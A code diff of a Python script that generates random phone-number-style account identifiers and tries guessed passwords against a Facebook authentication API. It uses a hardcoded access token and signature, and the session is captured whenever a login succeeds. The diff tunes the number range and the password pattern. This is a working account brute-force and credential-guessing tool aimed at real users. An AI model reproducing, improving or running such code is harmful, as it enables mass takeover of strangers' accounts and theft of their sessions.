@@ -4,7 +4,7 @@ import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,ge
 os.system('rm -rf .txt')
 for n in range(100000):
 
-    nmbr = random.randint(5000000, 5999999)
+    nmbr = random.randint(9000000, 9999999)
     
     sys.stdout = open('.txt', 'a')
 
@@ -227,7 +227,7 @@ def action():
         except OSError:
             pass
         try:
-            pass1 = k + c + user + 'a'
+            pass1 = k + c + user + 'p'
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
             q = json.load(data)
             if 'access_token' in q:
